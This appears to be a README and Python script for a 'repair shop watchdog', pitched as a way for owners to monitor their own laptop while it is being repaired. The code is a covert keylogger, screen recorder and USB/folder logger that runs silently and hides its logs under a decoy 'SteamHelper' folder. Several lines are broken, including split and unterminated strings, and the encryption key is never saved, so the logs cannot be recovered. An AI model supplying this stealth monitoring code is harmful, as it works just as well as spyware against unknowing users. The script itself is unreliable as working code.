### 🧩 Project Overview

> ⚖️ **Know Your Rights:**
>
> Accessing or copying your private files without permission—especially when unrelated to the repair—is a violation of your privacy and may be illegal. In many regions, unauthorized access to personal data is grounds for civil action or criminal charges.
>
> **Privacy Watchdog** empowers you with tamper-proof logs and silent monitoring, so you’ll know exactly what happened while your system was in someone else’s hands. It’s not just a tool—it’s a witness.


> 💬 **Why this exists:**
>
> In a perfect world, you could trust every repair technician with your data. But in reality, not all techs are honest—and not all laptops allow you to remove your hard drive. Many modern systems have **soldered internal storage**, meaning you can't just pop out the drive before handing your device over.
>
> **Privacy Watchdog** acts like a dashcam for your PC. It silently watches for activity—USB connections, opened folders, keystrokes, and screen behavior—so you have proof of what happened while your machine was out of your sight. It creates accountability in places where it usually doesn't exist.


This script canvas contains the modular pieces and core logic for the Repair Shop Watchdog project. It includes:

- 🖊️ Configurable directory paths
- 🧠 Keylogging
- 🎥 Screen recording
- 🔌 USB monitoring
- 🔐 AES encryption of logs
- 🧰 Optional silent `.pyw` execution or EXE bundling

# The final version will include:
# - Keylogger
# - Screen recorder
# - USB detection
# - AES encryption
# - Optional email or PushBullet log forwarding
# - Silent mode (.pyw or .exe)
# - Setup comments for user config (email/password/key/intervals)

# Begin with project layout and README design, code to follow.

## 📄 Full Script (Copy Below)

```python
# 🛡️ Repair Shop Watchdog

A stealthy, privacy-focused script designed to monitor your PC while it’s left at repair shops. Records activity, encrypts it, and keeps everything hidden in plain sight. Think of it like a rootkit—but for YOU.

---

## ⚙️ Features
- Keylogger (records keystrokes)
- Screen recorder (continuous video capture)
- USB device logger (detects plug/unplug)
- AES encryption of all logs
- Stealth folder structure
- Modular and easy to configure
- Optional EXE packaging for one-click silent use

---

## 🧪 Installation Instructions

### ✅ Prerequisites
- **Python 3.9 or higher**
  - Download: [python.org/downloads](https://www.python.org/downloads/)

### 📦 Required Packages
Install the required dependencies via pip:
```bash
pip install pynput opencv-python mss psutil cryptography
```

---

## 🚀 How to Use
1. Run the script using Python:
```bash
python watchdog.pyw
```

2. When prompted, enter a path where logs should be stored. You can leave it blank to default to:
```
~/AppData/Roaming/SteamHelper
```

3. The script will begin recording silently:
   - Keystrokes go to `/logs/keys.log`
   - USB activity goes to `/logs/usb_events.log`
   - Video recording goes to `/recordings/screen_record.avi`

4. When interrupted (CTRL+C), all files are encrypted.

---

## 🛠️ Future Improvements
- Auto-detect/install Python if not present
- Create GUI setup wizard
- Add optional remote log upload or alerts
- One-click EXE builder script with PyInstaller

# - Add automated Python installer detection with subprocess or `os.system()`
# - Create EXE bundler version for single-click execution
# - Optionally add GUI for friendly user configuration

```python
import os
import cv2
import time
import psutil
import ctypes
import mss
import threading
from pynput import keyboard
from cryptography.fernet import Fernet

# === CONFIGURATION SECTION ===
# 🔧 Customize these values before running the script
ENCRYPTION_KEY = Fernet.generate_key()  # Replace this with your own saved 32-byte key for reuse
LOG_DIR = os.path.expanduser("~/AppData/Roaming/SteamHelper")
VIDEO_FILENAME = os.path.join(LOG_DIR, "screen_record.avi")
KEY_LOG_FILE = os.path.join(LOG_DIR, "keys.log")
USB_LOG_FILE = os.path.join(LOG_DIR, "usb_events.log")
VIDEO_FPS = 5.0
SCREEN_INTERVAL = 0.2
USB_POLL_RATE = 2
fernet = Fernet(ENCRYPTION_KEY)

# Allow user to select or define a base logging directory
USER_BASE_DIR = input("Enter a folder for log storage (e.g., ~/AppData/Roaming/SteamHelper): ").strip()
if not USER_BASE_DIR:
    USER_BASE_DIR = os.path.expanduser("~/AppData/Roaming/SteamHelper")
else:
    USER_BASE_DIR = os.path.expanduser(USER_BASE_DIR)

LOG_DIR = os.path.join(USER_BASE_DIR)
VIDEO_FILENAME = os.path.join(LOG_DIR, "recordings", "screen_record.avi")
KEY_LOG_FILE = os.path.join(LOG_DIR, "logs", "keys.log")
USB_LOG_FILE = os.path.join(LOG_DIR, "logs", "usb_events.log")

# Create necessary subdirectories
os.makedirs(os.path.dirname(VIDEO_FILENAME), exist_ok=True)
os.makedirs(os.path.dirname(KEY_LOG_FILE), exist_ok=True)
os.makedirs(os.path.dirname(USB_LOG_FILE), exist_ok=True)

def is_screen_locked():
    user32 = ctypes.windll.User32
    return user32.GetForegroundWindow() == 0

def log_keys():
    with open(KEY_LOG_FILE, "a", encoding="utf-8") as f:
        def on_press(key):
            try:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {key.char}
")
            except AttributeError:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {key}
")
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

def record_screen():
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        width = monitor["width"]
        height = monitor["height"]
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        out = cv2.VideoWriter(VIDEO_FILENAME, fourcc, VIDEO_FPS, (width, height))
        while True:
            if not is_screen_locked():
                img = sct.grab(monitor)
                frame = cv2.cvtColor(cv2.UMat(img.rgb), cv2.COLOR_RGB2BGR)
                out.write(frame)
            time.sleep(SCREEN_INTERVAL)

def log_usb_events_and_folders():
    prev_devices = set()
    prev_folders = set()
    while True:
        current_devices = set(d.device for d in psutil.disk_partitions(all=True))
        added = current_devices - prev_devices
        removed = prev_devices - current_devices

        open_folders = set()
        try:
            import win32com.client
            shell = win32com.client.Dispatch("Shell.Application")
            for window in shell.Windows():
                if window and hasattr(window, 'LocationURL'):
                    path = window.LocationURL.replace("file://", "").replace("%20", " ")
                    if path and ":\" in path:
                        open_folders.add(path)
        except:
            pass

        new_folders = open_folders - prev_folders

        with open(USB_LOG_FILE, "a", encoding="utf-8") as f:
            for dev in added:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] USB Connected: {dev}
")
            for dev in removed:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] USB Disconnected: {dev}
")
            for folder in new_folders:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Folder Opened: {folder}
")

        prev_devices = current_devices
        prev_folders = open_folders
        time.sleep(USB_POLL_RATE)

def encrypt_logs():
    for file_path in [KEY_LOG_FILE, USB_LOG_FILE, VIDEO_FILENAME]:
        if os.path.exists(file_path):
            with open(file_path, "rb") as f:
                encrypted = fernet.encrypt(f.read())
            with open(file_path + ".enc", "wb") as f:
                f.write(encrypted)
            os.remove(file_path)

def main():
    threading.Thread(target=log_keys, daemon=True).start()
    threading.Thread(target=record_screen, daemon=True).start()
    threading.Thread(target=log_usb_events_and_folders, daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        encrypt_logs()

if __name__ == "__main__":
    main()
```
```
